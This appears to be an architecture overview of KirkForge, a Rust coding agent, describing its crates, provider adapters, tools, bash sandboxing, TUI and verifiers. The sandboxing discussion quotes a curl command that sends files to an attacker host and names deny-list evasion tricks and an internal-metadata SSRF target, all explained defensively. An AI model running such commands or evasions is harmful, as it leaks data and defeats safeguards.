# KirkForge Architecture

KirkForge is a provider-agnostic, verification-first coding agent. It combines
semantic code understanding, token-budget management, context compression, and
deterministic verification into a single Rust binary with an interactive TUI.

This document ties the pieces together. It is the map; the ADRs in
[docs/adr/](docs/adr/) are the pinned decisions.

---

## Identity

KirkForge is not "Claude Code with more providers" or "Vix in Rust." It is a
synthesis with its own architectural contributions:

| Concern | KirkForge's answer |
|---|---|
| Provider lock-in | One `ModelAdapter` trait, six concrete providers (Ollama, OpenAI-compat, Anthropic direct, Bedrock, Vertex, OpenCode-Zen). Model-name routing heuristics pick the adapter; config overrides win. |
| Context quality | Tree-sitter symbol/import/call-graph index (`kf-context-index`) gives the agent graph-grounded retrieval instead of plain-text search. Four languages: Rust, TypeScript, Python, Go. |
| Context cost (input side) | Stratum compression pipeline classifies and compacts bloated tool outputs *before* they enter the context window. |
| Context cost (output side) | Budget guard (`kf-budget-core`) tracks token spend against a ceiling and slices or compacts oversized tool results when the budget is approached. |
| Execution reliability | A verifier bus runs build, test, lint, rustfmt, git-state, and security checks after file-modifying tool calls. A correction loop auto-applies rustfmt fixes; build/lint/test findings are fed back to the model as tool-result suggestions. |
| Reproducibility | Enforced plan mode (`/plan` then `/implement`), per-result checkpointing mid-batch, execution replay (ADR-039), and conversation logging. |
| Extensibility | A manifest-based plugin system (`kf-code.toml`) with trust tiers, minisign signature verification, and four capability kinds: skills, tools, hooks, verifiers. |

---

## Workspace layout

The workspace has one binary crate (`kf-code`) and 13 satellite crates under
`crates/`. The binary is the user-facing CLI; the satellites are libraries and
standalone binaries.

```
kf-code (root bin)          ← the CLI the user runs
├── src/                       ← agent core (session, tools, TUI, adapters, verifiers)
├── crates/                    ← 13 satellite crates
│   ├── kf-plugin-sdk     ← plugin SDK: manifest types, trust tiers
│   ├── kf-plugin-host  ← plugin runtime: registry, dispatch, signatures
│   ├── kf-context-index← tree-sitter symbol/import/call-graph index
│   ├── kf-workflow     ← programmable JSON workflow engine
│   ├── kf-lsp          ← LSP client pool for symbol-aware navigation
│   ├── kf-bench        ← task-benchmark harness (types + verifier + reports)
│   ├── kf-compress-core       ← context-compression pipeline library + ruleset filtering
│   ├── kf-budget-core           ← budget/orchestrator/slicing data model
│   ├── kf-routing              ← pure Rust port of orchestrator pure modules (classifier, routing, correction, path safety) — foundation for WO 29.7
│   ├── kf-rbac                 ← RBAC (4 roles × 16 perms), timing-safe API-key auth, OIDC JWT/JWKS verification — port of @kirkforge/core-rbac (WO 29.5)
│   ├── kf-memory-store ← routing-oriented memory store (MemoryStore facade + InMemory/File/SQLite adapters) — port of @kirkforge/memory-palace (WO 29.6)
│   ├── kf-orchestrator ← orchestrator delegation + decompose + correction pipeline + mode executors (trait-based ModelClient seam) — port of @kirkforge/orchestrator (WO 29.7)
│   └── kf-testdoctor   ← test-performance doctor (workspace member; profile, profile-per-test, classify, partition, suggest, suggest-detailed, apply, gaps, diagnose, flaky)
├── benches/tasks/             ← 30 benchmark task definitions (TOML)
└── docs/adr/                  ← 92 Architecture Decision Records
```

The workspace has ~3,300 `#[test]` functions (~2,400 under `src/`,
~860 under `crates/`). The `crates/` count is pinned by the
`readme_drift` test (`crates/kf-budget-core/README.md` State table).

### Compiled-in vs satellite

The root `kf-code` binary directly depends on eight crates:

| Crate | Role |
|---|---|
| `kf-plugin-sdk` | Plugin manifest types and trust-tier logic |
| `kf-plugin-host` | Plugin registry, dispatch, in-process signature verification (ADR-057) |
| `kf-context-index` | Tree-sitter indexing and graph retrieval |
| `kf-workflow` | JSON workflow engine (reuses the `task` tool's spawner) |
| `kf-lsp` | LSP client pool |
| `kf-bench` | Benchmark task types, loader, verifier, report writers |
| `kf-testdoctor` | Test-coverage diagnostics behind `kf-code doctor` (WO 12.4) |
| `kf-orchestrator` | Delegation/decompose/correction pipeline; `ModelClient` impl + security verifier (WO 35.6) |

The remaining five crates are **satellites**: they build as support
libraries. `kf-compress-core` and `kf-budget-core` compile in behind the
`stratum` / `budget` features (ADR-046/047) and retain shell-plugin fallbacks
for feature-off builds (ADR-050). `kf-routing`, `kf-rbac`, and
`kf-memory-store` are foundation libraries (WO 29.3–29.7 ports) with no
shell fallback — they exist only as Rust.

**Release-binary cost of the orchestrator chain (WO 36.1, 2026-08-19).**
Measured in one worktree (`cargo build --release -p kf-code`, packaged
like `release.yml`'s tar.gz): with the WO 35.6 `kf-orchestrator` dep
20,619,832 bytes raw / 7,322,987 bytes tar.gz; with the dep removed
20,603,448 / 7,317,485 — a 16,384-byte (0.08%) cost, far under the ~5%
gate, so the dep stays ungated. The chain is
`kf-orchestrator → kf-memory-store → rusqlite` (bundled SQLite C), but
nothing in the binary constructs `SqliteAdapter` (kf-code's `remember`
tool uses its own JSON-file `shared::memory::MemoryStore`, a different
type), so fat LTO + `opt-level = "z"` drops the unreachable SQLite code
and the linker never pulls the bundled C objects. Re-measure if a
binary code path starts calling kf-memory-store's
`MemoryStore::open`/`SqliteAdapter`.

### Crate map

| Crate | Owner | Purpose | Status |
|-------|-------|---------|--------|
| `kf-plugin-sdk` | session | Plugin manifest types, trust tiers | Active |
| `kf-plugin-host` | session | Plugin registry, dispatch, signatures | Active |
| `kf-context-index` | session | Tree-sitter symbol/import/call-graph index | Active |
| `kf-workflow` | session | JSON workflow engine (DAG of persona steps) | Active |
| `kf-lsp` | tools | LSP client pool for symbol-aware navigation | Active |
| `kf-bench` | session | Benchmark task types, loader, verifier, reports | Active |
| `kf-compress-core` | session | Context-compression pipeline library + rules | Active |
| `kf-testdoctor` | quality | Test-performance diagnostics | Active |
| `kf-budget-core` | session | Budget/orchestrator/slicing data model | Active |
| `kf-routing` | session | Pure orchestrator modules: classifier, routing, correction, truth model, profiles, cost, path safety (WO 29.3) | Active |
| `kf-rbac` | security | RBAC (roles/permissions/actor), timing-safe API-key auth, OIDC JWT/JWKS verification — port of `@kirkforge/core-rbac` (WO 29.5). ES512 verify deferred (jsonwebtoken has no ES512 variant). | Active |
| `kf-memory-store` | session | Routing-oriented memory store: MemoryStore facade + InMemory/File/SQLite adapters (port of `@kirkforge/memory-palace`, WO 29.6) | Active |
| `kf-orchestrator` | session | Orchestrator delegation + decompose + correction pipeline + mode executors (trait-based ModelClient seam) — port of `@kirkforge/orchestrator` (WO 29.7). `ModelClient` production impl: `src/session/executor_adapter.rs` (WO 35.6, ADR-075). Reducer + deterministic verifiers still deferred. | Active |

"Excluded" crates exist on disk but are not built by default.

---

## The agent core (`src/`)

The binary's source is organized into eight top-level modules:

### `session/` — the agent loop

The largest module (~30 submodules). It owns:

- **Executor** (`executor/`): the turn loop. Dispatches tool calls (serial or
  parallel batches per ADR-0020), collects stream events, emits plan-reason
  trace events (ADR-0032), checkpoints after each tool result (ADR-0034).
- **Verifiers** (`verifier/`): the verification bus and correction loop (see
  [Verification](#verification)).
- **Plugin tools** (`plugin_tools/`): loads plugin manifests. External plugins
   are wrapped in `PluginToolWrapper` (implements the `Tool` trait, spawns the
   shell script as a subprocess). Folded plugins (Stratum, Budget)
   register as direct Rust `Tool` impls when their feature is on (ADR-050).
   Workspace plugins (`plugin_sources`) are NOT trusted by default: a model
   with `write_file` access can drop a plugin + manifest into a workspace
   path, so signature verification on workspace plugins is enforced unless
   the operator opts in via `plugin_trust_workspace = true` (H10 / WO 27.4).
   Data-dir plugins use the global `plugin_signature_validation` toggle.
- **Plugin ops** (`plugin_ops.rs`): shared plugin-ops layer used by both the
  TUI `/plugins` slash-command family and the `kf-code plugin` CLI
  subcommand (`list`, `enable`, `disable`, `toggle`, `validate`, `reload`,
  `sources`, `add`, `remove`, `doctor`). Pure functions over `&Config` /
  `&mut Config`; the TUI keeps its `mpsc` reload plumbing, the CLI mutates
  the config and prints "restart to apply" (ADR-056, WO 11.0).
- **Hooks** (`hooks.rs`): fires plugin hooks on lifecycle events
  (`session-start`, `post-turn`, `pre-tool-bash`, `post-tool-bash`,
  `post-tool-write_file`, `pre-compact`). Folded plugins register
  `InProcessHook` handlers that run in-process with full `HookContext`
  (including tool result content). External plugins use shell scripts.
- **Prompt** (`prompt/`): builds the model prompt from conversation history,
  system instructions, tool definitions, and retrieved context. Includes
  microcompaction (ADR-0027) for stale turns.
- **Router** (`router.rs`): routes tool calls to built-in tools or plugin tools.
- **Hooks** (`hooks.rs`): fires plugin hook scripts on lifecycle events
  (`session-start`, `post-turn`, `pre-tool-bash`, `post-tool-bash`,
  `post-tool-write_file`, `pre-compact`).
- **Skills** (`skills.rs`): slash-command prompts backed by plugins or built-in
  personas (`/explore`, `/plan`, `/coder`).
- **Config** (`config/`): TOML config parsing, env overrides, live-reload diff.
- **Bench** (`bench.rs`): headless session executor for benchmark tasks.
- **Replay** (`replay.rs`): execution replay for debugging (ADR-039).

### `adapters/` — provider abstraction

One file per provider plus shared body builders and retry logic. The
`ModelAdapter` trait is the only seam the session layer sees:

```rust
#[async_trait]
pub trait ModelAdapter: Send + Sync {
    fn model_info(&self) -> ModelInfo;
    async fn stream(&self, messages: &[Message], tools: &[ToolDef])
        -> anyhow::Result<Receiver<StreamEvent>>;
}
```

Provider selection: config `model_type_override` wins; otherwise model-name
prefix heuristics (`claude-*` → Anthropic, `glm*`/`deepseek*`/`gemini*`/`kimi*`
→ Ollama-kind, `opencode/` → OpenCode-Zen, else → OpenAI-compat). The `provider`
field selects the Anthropic cloud backend (direct, Bedrock, or Vertex).

**Per-provider API key resolution** (`adapters/auth.rs`): each adapter resolves
its API key via `resolve_api_key(provider, config_key)`, which returns the first
non-empty value from: (1) the config field (`[model].anthropic_api_key`, etc.),
(2) the standard env var (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, etc.), (3)
keychain (stubbed to `None`; Series 18). The Anthropic adapter sends the key as
`x-api-key` and returns a clear error before any HTTP request if no key is
available. Keychain/OAuth expansion is planned for Series 18.

### `tools/` — built-in tools

20 tools implementing the `Tool` trait (17 always registered + 3 conditional),
registered in `all_tools()` (`src/tools/mod.rs`): `read_file`, `write_file`,
`edit_file`, `notebook_edit`, `bash`, `bash_status`, `bash_cancel`, `grep`,
`glob`, `web_fetch`, `web_search`, `task`, `task_output`, `workflow_run`,
`todo_write`, `todo_read`, `remember` are always registered; `read_image`
(when `supports_images`), `lsp_query` (when an LSP pool is configured), and
`computer_use` (when enabled with image support + config) are conditioned on
their capability flags in `ToolContextBuilder`. (`atomic_write` and
`bash_minify` are internal helper modules, not model-facing tools.) The
`workflow_run` tool (WO 9.1) wraps the `kf-workflow` crate's `WorkflowExecutor`
so the agent loop and bench harness can invoke workflows via tool calls,
reusing the same in-process `TaskSpawner` as the `task` tool. Plugin tools are
registered alongside these at runtime.

The `bash` tool has three isolation layers: Docker execution mode
(`--docker`, ADR-036) for full container isolation, lightweight rlimit
hardening (`--harden`, ADR-054) for the non-Docker path, and Linux landlock
filesystem confinement (WO 27.1, default-on for Linux, fail-closed, applied
via the same `pre_exec` hook as the rlimits — not a Cargo feature). The
`--harden` flag applies `RLIMIT_CPU` / `RLIMIT_AS` / `RLIMIT_FSIZE` to
the child shell in a `pre_exec` hook (Unix only; Windows no-op with a
warning). It is ignored when `--docker` is set (Docker already enforces
`--memory` and `--cpus`). An optional fourth layer — a seccomp-bpf syscall
filter (WO 30.4) — confines the syscall surface to an allowlist (everything
else fails with `EPERM`); it is default-OFF behind the `seccomp` Cargo
feature and applied last in the same `pre_exec` hook, after landlock. See
`src/session/bash_runner/seccomp.rs`.

**Security posture — tripwire vs boundary (WO 28.17 R1):** the bash
deny-list + dangerous-pattern scan (`src/shared/bash_safety.rs`) is a
**tripwire**, not a boundary. It narrows the obvious-payload surface and
catches naive evasion (`${IFS}`, `$()`, backticks), but a determined payload
evades via encoding (base64/hex + eval) or variable indirection — no
substring/regex blocklist can resolve runtime state. The **boundary** is
landlock filesystem confinement (caps the blast radius to allow-listed
paths) plus `--no-network` (`unshare(CLONE_NEWNET)`, blocks exfiltration).
Do not mistake the deny-list for a boundary: it raises the bar for trivial
payloads, it does not confine. The only non-theatrical command gate is an
allowlist (`bash.require_allowlist`, WO 28.17 R2 — deferred pending operator
input on glob/prefix/regex semantics); an allowlist is the only
blocklist-shape that isn't theater.

**Operator guidance for unattended runs (WO 27.5 R3):** for headless / CI /
scheduled-job execution, run with `--harden --no-network`. `--no-network` is
the only thing that blocks data exfiltration like
`curl -F f=@sensitive https://attacker.example/` — landlock is FS-only and
the deny-list is a substring tripwire, not a network boundary. `--no-network`
calls `unshare(CLONE_NEWNET)` (Linux only) to place every spawned shell in an
empty network namespace, so no outbound connection can succeed regardless of
what the model emits. Network access stays opt-in per the user-confirmed
design (a tool that legitimately needs `cargo` / `npm` / `git fetch` cannot
run with `--no-network`); the default interactive posture is network-on, the
recommended unattended posture is network-off.

WO 15.3 closed three SSRF / injection surfaces across the networked
tools. (1) The `computer_use` Chrome launcher now passes
`--host-resolver-rules="MAP * ~NOTFOUND, EXCLUDE localhost, EXCLUDE
127.0.0.1"` so a page loaded by `open`/`navigate` cannot `fetch`
internal IPs (e.g. `169.254.169.254`) from inside the browser via
`evaluate` — all DNS except localhost returns NXDOMAIN. (2) `web_fetch`
resolves the URL host via the OS resolver and rejects the request when
any resolved `IpAddr` is loopback / link-local / RFC1918 / RFC4193,
closing the DNS-rebinding door where a public hostname's A record
points at `127.0.0.1`. Literal-IP hosts are not re-resolved (no TOCTOU
on a pinned literal). (3) The `bash` Docker path now canonicalizes the
bind-mount source and rejects a workdir whose path contains `:` (which
Docker would parse as host/container/opts split), and routes the
model-supplied `cmd` through `check_bash_command_str` — the Docker
branch previously skipped the deny-list / dangerous-pattern gate that
the foreground path runs.

### `tui/` — interactive UI

A ratatui-based terminal UI with chat, input, status, search, slash commands,
plugin management, persona switching, session forking/resume, and approval
gates. Drains three event sources (user input, model stream, approval queue) in
a single loop.

The `/help` text is generated from the `COMMANDS` table in
`src/tui/keys/slash_commands.rs` and grouped into sections (Session, Model,
Safety, Workflow, Plugins, Diagnostics) in a fixed order defined by the
`GROUPS` const — adding a command is one row + one match arm, and the
`help_text_groups_cover_all_commands` test enforces that every row carries a
`group` tag.

The TUI also surfaces a **doom-loop warning banner** when the executor detects
the same tool failing the same way 3 turns in a row (the
`DoomLoopTracker` in `src/session/executor/loop_.rs`). The banner offers three
actions — break (cancel the in-flight generation), plan (switch into plan mode
so mutating tools are denied), and continue (dismiss). A successful tool call
resets the tracker so the next failure starts a fresh run. The TUI is purely
reactive: the executor owns the detector and emits a `TurnEvent::DoomLoopDetected`
that the TUI's `dispatch_turn_event` translates into banner state.

**Doom-loop circuit breaker** (WO 23.8): after N cumulative doom-loop hits
(default 1, configured via `doom_loop_max_hits` / `KF_CODE_DOOM_LOOP_MAX_HITS`),
the executor auto-switches to plan mode (emitting `TurnEvent::DoomLoopRemediation`
with `action: "auto_plan_mode"`). Note this circuit-breaker counter (default 1)
is distinct from the warning banner's `DoomLoopTracker::THRESHOLD` of 3
identical errors in a row described above — the banner surfaces the loop, the
circuit breaker takes remediation action. If already in plan mode when the breaker fires,
the turn is halted with an error message (`action: "halt"`). Setting
`doom_loop_max_hits = 0` disables the circuit breaker entirely (pre-WO behavior).
The cumulative hit counter persists across tool types within a session.

`/permissions list | revoke <i> | clear` (WO 14.5) surfaces the permission
rules created by the approval dialog's `[A]lways` key. The pure ops layer
(`src/tui/commands/permissions.rs`) mutates `Config.security.permission_rules`
in place; the TUI match arm persists via `save_config` on `revoke`/`clear`
(`list` is read-only). 1-indexed positions match `/jobs` and `/undo list`.

The **status bar** (`render_status` in `src/tui/widgets/status.rs`) degrades by
priority on narrow terminals: low-value spans (plugin count, skills, tool-call
counter, Ctrl+T hint) drop before overlapping, while elapsed, cost, and the
`⚠️ UNSANDBOXED` warning stay at all widths. The drop loop re-runs every frame,
so a resize to 40 cols immediately re-evaluates the priority mask.

The `⚠️ UNSANDBOXED` bar flag means exactly "no PathGuard write scope" — it says
nothing about the other sandbox layers. The full picture is the `/status`
**sandbox posture checklist** (WO 35.4): five rows (PathGuard, Landlock,
seccomp, network ns, worktree) rendered from `SandboxPosture::from_config`
(`src/session/sandbox_posture.rs`), a pure config + compile-time-cfg snapshot
(Landlock mirrors the `#[cfg(target_os = "linux")]` module gate, seccomp
`cfg!(feature = "seccomp")`, netns the `harden && no_network` bash-runner gate).
✗ rows carry their enable hint (`build with --features seccomp`,
`pass --no-network`) so the opt-in features are discoverable without reading
Cargo.toml; the checklist is read from the live shared config, so `/reload`
keeps it honest.

`/sessions tree` renders the fork tree as ASCII (read from
`<data_dir>/sessions/forks/<id>/fork.json` via
`session_index::build_fork_tree`). The result is a flat list of roots with
`children` lists; orphan forks (parent not in the session set) are surfaced as
roots so dangling metadata is never silently dropped. The TUI side is in
`src/tui/commands/sessions.rs::tree_sessions_text`.

The input box offers **Tab-completion** (WO 14.6): when the buffer starts with
`/`, Tab completes against the `COMMANDS` primary triggers (prefix match —
readline contract, no fuzzy); when it starts with `@`, Tab completes the path
portion against the filesystem (the `:A-B:raw` suffix is left alone). A single
match replaces the buffer; multiple matches populate
`AppState::conversation.completion_suggestions`, rendered as a one-line dim
hint above the input text. The completion layer is `complete_command` (pure, over `COMMANDS`)
and `complete_path` (`std::fs::read_dir`, capped at 24 entries). The legacy
"Tab on empty input toggles expand/collapse" behavior is preserved when the
buffer doesn't start with `/` or `@`.

The **scout subagent** (Workorder 8.2c) is the in-process, fork-free sibling
of `/explore`. Where `/explore` always spawns a forked executor in a
background task, the scout runs synchronously in the calling task and never
touches the conversation log. The `ScoutSubagent` struct in
`src/session/executor/scout.rs` holds the canonical read-only `SCOUT_TOOLS`
allow-list (`read_file`, `read_image`, `grep`, `glob`) and exposes a
`filter_tools` helper that drops anything not in the list. The persona side
is `tools_for_scout` in `src/tui/commands/persona.rs`. The scout is the
most conservative subagent surface — same read-only tools as the `/plan`
persona, but no `bash` (the bash sandbox adds attack surface that has not
been independently audited).

The **`task`-tool subagents** (`InProcessTaskSpawner` in `src/session/task_spawner.rs`,
WO 28.1) are a separate surface from the scout: each `task` tool call spins up an isolated
`Executor` with a throwaway conversation log and a persona-restricted toolset (`explore` =
read-only + bash, `plan` = read-only research, `coder` = full toolset). Two isolation
controls apply (WO 30): **approval forwarding** — subagent destructive-tool approval requests
are forwarded to the *parent* session's approval channel (set on the spawner from
`Executor::run_turn`), so the user sees and decides them interactively in the TUI / line-mode;
with no parent channel (top-level scheduled job) the P0 policy applies (auto-approve in CI,
deny otherwise). **Worktree isolation** (WO 35.2) — when `session.worktree_enabled` is set, a
`coder` subagent gets its own `git worktree` (branched from the parent sandbox when that is
itself a worktree, else the process CWD) and the cloned config's `sandbox_dir` is pointed at
it before `access_from_config`, so the path guard, landlock extra paths, and the subagent
executor's guard tower all center on the worktree; the executor receives a frozen config
clone, not the live parent shared config. Before the worktree is dropped, uncommitted edits
(tracked + untracked via `git add --intent-to-add`) are captured with `git diff HEAD` and
returned as an appliable patch appended to the task summary, so the parent model can `git
apply` the subagent's work; on an error return the patch is not captured (disclosed ceiling).
`explore`/`plan` read the parent workspace unchanged. Bash CWD is not confined to the
worktree (deferred — bash keeps its existing landlock/sandbox posture). The subagent temp
dir (`kf-code-task-*`, conversation log + checkpoints) is removed by a Drop guard, so error
returns and cancellation no longer leak it. Note: the executor's spawner is threaded into the dispatch
`ToolContext` via `PreparedCall` (the parent `task` tool reaches it through `ctx.task_spawner`).

Personas currently route through Anthropic-direct only. Bedrock/Vertex-configured users should use Anthropic API keys for persona invocation.

**Per-subagent provider override** (WO 30.0.6 brain+brawn): the optional
`[subagent_provider]` config block (TOML) or `KF_CODE_SUBAGENT_*` env vars
let subagents run on a different model + host + API keys than the parent.
Every field is optional; an unset field inherits the parent's value, so a
partial block (e.g. `model` + `ollama_host` only) keeps the parent's API
keys. `InProcessTaskSpawner` resolves the model as `task`-tool arg →
`subagent_provider.model` → parent's `default_model`; host and per-provider
keys fall back to the parent when unset. Enables the brain+brawn split: an
expensive cloud model orchestrates while cheap brawn runs on a different
provider/account.

**Color themes** (WO 27.6): the TUI ships a central `Theme` palette (`src/tui/theme.rs`) covering every color role the markdown renderer, search highlighter, table grid, and budget indicator use. Four built-ins: `default` (prior hard-coded colors — the back-compat baseline), `dark` (high-contrast dark), `light` (readable on white terminals — swaps `Black`/`Cyan`/`Yellow` for higher-luminance alternatives), and `monokai` (warm palette with the canonical Monokai hex values). The active theme is selected by `display.theme` (TOML) or `KF_CODE_THEME` (env), both defaulting to `"default"`, and is live-switchable via the `/theme [name]` slash command — `/theme` with no argument cycles through the four built-ins. Unknown names fall back to `default`. The render functions in `src/tui/rendering/` take a `&Theme` and read colors by role name (`code_block_fg`, `link`, `budget_tight`, …); zero `Color::*` literals remain in production code under `rendering/`. Custom user-loaded palettes are explicitly out of scope (upgrade path: a `Theme::custom(palette)` constructor reading a TOML color map).

**Mouse support** (WO 27.7): the TUI enables crossterm mouse capture at startup and routes click/drag/scroll through `events::handle_mouse_event` (`src/tui/events.rs`). The mouse wheel scrolls the chat (unchanged from before); a left-click in the chat body "grabs" the view (turns auto-follow off so it sticks where the user clicked) and a subsequent left-drag scroll-pans the chat by the row delta (natural scrolling — content follows the drag). WO 34.1 removed the top tab bar, so row 0 is now the header and a click there is a drag-grab (not a tab switch) — the command palette (Ctrl+K) and direct Ctrl-shortcuts (Ctrl+M/S/J/,/P) replace click-to-switch-tab. `DisableMouseCapture` runs in both the normal shutdown path and the panic-safe `TerminalGuard::drop`, so the terminal is never left with capture stuck on. Operators who dislike mouse capture hijacking their scrollback wheel can disable all of it with `display.mouse_enabled = false` (TOML) or `KF_CODE_MOUSE_ENABLED=false` (env) — when false, `EnableMouseCapture` is skipped entirely so the terminal keeps native scrollback. Click-to-position the text cursor inside the prompt input is deferred to 27.7-R2-later (the `LineReader` does not expose a set-position API cleanly); panel focus + drag-scroll alone close the competitive gap.

**Command palette + overlay architecture** (WO 34.1): the persistent F1–F6 tab bar is gone. The top of the screen is a one-line header (`render_header` in `src/tui/widgets/tabs.rs`): app name + current model + a ready/busy indicator. `ActiveTab` gains a `None` variant (the default — chat-only mode, no overlay). Chat is the permanent primary surface; the former tabs (Models/Plugins/Jobs/Settings/Threads) are overlays summoned three ways: the command palette (Ctrl+K — a centered popup with a search input + fuzzy-filtered action list, `src/tui/widgets/command_palette.rs`), direct Ctrl-shortcuts (Ctrl+M→Models, Ctrl+S→Sessions, Ctrl+J→Jobs, Ctrl+,→Settings, Ctrl+P→Plugins), and F-keys as an invisible muscle-memory fallback. Esc clears any active overlay back to `ActiveTab::None`. The palette actions cover the 5 overlay tabs plus slash-command actions (Compact/Help/Test/Commit/Undo/Clear), a Search-conversation action (enters Ctrl+F search mode), and Change-model (Models overlay). Overlays currently render in the main content area (replacing the chat view, matching pre-34.1 behavior); true overlay-on-top-of-chat rendering is the WO 34.1 step-5 goal and is deferred (see the `ponytail:` comment in `render_app`).

### `shared/` — cross-cutting types

`Config` (decomposed into 5 `#[serde(flatten)]` sub-structs: `ModelConfig`,
`SecurityConfig`, `ToolConfig`, `SessionConfig`, `DisplayConfig`), `Message`,
`Role`, `StreamEvent`, `ToolDef`, `ToolOutcome`, `ModelInfo`, `ContentPart`,
metrics, backoff, permissions, minify, audit, event_bus. The audit log records
destructive tool calls (`AuditEntry::Tool`) and hook denials / fail-open
failures (`AuditEntry::Hook`, WO 11.6 / ADR-061) as append-only NDJSON
with a `"kind"` tag. WO 29.4 added the tamper-evident hash-chained audit
trail alongside the existing log: `AuditEvent` (29-literal `AuditAction`
+ `AuditOutcome`), `initial_hash`/`chain_hash_of` (SHA-256, or HMAC-SHA256
when keyed via `KIRKFORGE_AUDIT_KEY`), `MemoryAuditSink`, `FileAuditSink`
(size-based rotation, default 50 MB / 10 files), `AuditLogger`, and a
`create_audit_sink` factory for `{memory, file}`. The `event_bus` module
ports `@kirkforge/core-events`'s `EventBus`: async `emit` with idempotency
cache (TTL + size cap) and bounded buffer, `on` returning an unsub
callable, `drain_buffer`, `shutdown`, and `graceful_shutdown`. Dead sinks
(http/syslog/worm) are deliberately not ported — zero production consumers.

`ToolConfig.max_continuation_rounds` (default 5, clamped 0–50) caps how many
times the turn loop will continue after `FinishReason::Length`. When the cap
is hit, the turn ends with a clear error message. Set to 0 to disable
continuation entirely (treat `Length` as `Stop`). Each continuation round
emits `TurnEvent::ContinuationRound { round, max }`, which the TUI surfaces
as "⟳ round/max" in the status bar (WO 23.9-R3). Env override:
`KF_CODE_MAX_CONTINUATION_ROUNDS`.

`ToolConfig.max_background_tasks` (default 4, clamped 1–64) controls the
semaphore size for `task(background=true)`. Only N background tasks run
concurrently; additional tasks either queue or are rejected depending on
`task_concurrency_mode`. Env override: `KF_CODE_MAX_BACKGROUND_TASKS`.

`ToolConfig.task_concurrency_mode` (default `"queue"`, values `"queue"` or
`"reject"`) controls backpressure when `max_background_tasks` is reached. In
`"queue"` mode, excess tasks wait for a permit (current behavior). In
`"reject"` mode, excess tasks immediately return a `Failure` outcome with a
message suggesting `task_output` or increasing `max_background_tasks`. Env
override: `KF_CODE_TASK_CONCURRENCY_MODE`.

Each background task is tracked with a derived `TaskStatus`
(`Pending | Running | Completed | Cancelled | Failed | TimedOut`) plus
`TaskMetadata` (model, persona, ≤100-char prompt summary, started_at,
duration_ms, token_estimate, parent_task_id). `TaskManager::cancel` (WO 35.3)
is cooperative: it sets the per-task flag, cancels the task's
`CancellationToken`, and the worker *awaits* `run_task` to completion — no
future-dropping. The subagent turn loop observes the flag between steps
(exiting early with its partial summary + worktree patch), in-flight tool
calls observe the token (a running bash's process group is killed in
milliseconds, not at `tool_timeout_secs` — the subagent executor's per-call
tokens are live children of the root token via `Executor::set_cancel_token`),
and `run_task`'s own cleanup runs (temp-dir Drop guard, patch capture).
Cancelled tasks keep status `Cancelled` but retain partial output in
`TaskHandle.cancelled_result`, surfaced by `task_output`. Known ceilings
(disclosed): an in-flight model stream ends at its next event or adapter
timeout rather than being aborted mid-request; background bash jobs
(`bash background=true`) spawned by a cancelled subagent are not killed (the
global `BashJobRegistry` has no owner tracking — they remain cancellable via
`bash_cancel` / `/jobs`); the parent session's own prompt-cancel keeps the
WO 15.7 snapshot-at-dispatch token semantics (only subagent executors attach
a live root token). `status` and `list` expose the state for the `/jobs` view
(WO 30.2).

### `daemon/`, `jobs/`, `line_mode/`, `main/`

Session daemon (background process tracking recent sessions), scheduled-job
daemon (cron-style, Unix-only), non-interactive line mode, and the binary entry
point.

---

## Verification

Verification is first-class. Two coexisting verifier designs serve different
needs (intentionally not unified, per AGENTS.md):

### Event-driven `Verifier` trait

```rust
#[async_trait]
pub trait Verifier: Send + Sync {
    fn name(&self) -> &str;
    fn priority(&self) -> u8;  // lower = higher priority
    async fn verify(&self, event: &BusEvent) -> Verdict;
}
```

`Verdict` is `Clean`, `Fixable(FixSuggestion)`, `Unfixable(VerificationError)`,
or `Skipped`. Built-in verifiers: `build` (cargo build on edited files),
`lint` (clippy), `rustfmt`, `test` (targeted tests for edited files), `git`
(git-state validation), `security` (dangerous-pattern scan), `plugin` (verifiers
declared by plugins). WO 31.1+31.4 added Python self-gating verifiers —
`python_test` (pytest), `python_lint` (ruff/flake8), `python_typecheck` (mypy,
fires only when configured) — alongside the Rust ones. WO 32.20 added
Node/Go/Generic verifiers following the same pattern: `node_test` (npm test /
vitest), `node_lint` (eslint / tsc --noEmit), `go_test` (go test), `go_vet`
(go vet), `generic_test` (make test / ctest / ./test.sh). `detect.rs` exposes
`detect_project_languages(&Path) -> Vec<ProjectLanguage>` (sniffs `Cargo.toml`
/ `pyproject.toml`|`setup.py`|`conftest.py` / `package.json` / `go.mod`) and
each non-Rust verifier self-gates on language-marker detection at the edited
file's project root, so registering all language verifiers is safe for
pure-Rust workspaces. Missing tools (no pytest/ruff/mypy/npm/go on PATH) skip
gracefully rather than blocking the turn.

WO 33.14 phase 3 injected a `CommandRunner` trait
(`src/session/verifier/types.rs`) abstracting `cargo`/`clippy` subprocess
execution. Production uses `SystemCommandRunner` (wraps
`std::process::Command`); tests inject a hand-rolled `FakeRunner` returning
canned cargo JSON. `verify_build`/`verify_lint`/`verify_test` take
`&dyn CommandRunner`, so the full event → cargo_root → spawn → parse → Verdict
orchestration path runs in-process against the fake. One real-Cargo/Clippy
integration test per verifier is kept `#[ignore]`d with an `integration:`
reason naming the nextest profile.

### Context-based `BusVerifier` trait (ADR-043)

A sync, context-based bus that unifies findings from multiple sources
(`Build`, `Test`, `Lint`, `Rustfmt`, `Git`, `Security`, `Plugin`) behind a
single `VerifierBus`. The executor queries the bus after file-modifying tool
calls and injects error verdicts into the conversation.

ADR-028 (Accepted, Workorder 7.7 + 9.6 + 10.8): plugin-declared
`Capability::Verifier` entries register into the same `VerifierBus` via
`VerifierBus::add_plugin_verifier` / `register_plugin_verifiers_into_bus`.
Each plugin verifier runs through the host crate's env-cleared
`PluginVerifier` subprocess (exit 0 = pass, non-zero = fail with stderr) and
is tagged `VerifierSource::Plugin(name)`. The executor's
`emit_tool_event_and_correct` converts each `Severity::Error` verdict into a
`CorrectionResult`, so a single correction path handles built-in and plugin
verdicts. The legacy event-driven `PluginVerifierAdapter` path is retained
for backward compatibility. The cross-language NDJSON wire bridge from WO
10.8 (a Node `bridge-emitter.ts` subprocess) is **retired as of WO 29.2**:
the 14 regex security rules now live in Rust
(`src/session/verifier/security_emitter.rs`) and the
`TsOrchestratorBridgeVerifier` is a thin `BusVerifier` wrapper that calls
`security_emitter::emit_security_findings(&changed_files)` directly — no
subprocess, no NDJSON round-trip. This was the last Rust→TS call path. The
Rust `VerifierBus` is authoritative: built-in verifiers register directly,
plugin verifiers register via `register_plugin_verifiers_into_bus`, and the
security scan registers via the `TsOrchestratorBridgeVerifier` wrapper.

The `kf-orchestrator` crate (library, cannot depend on the binary) has its
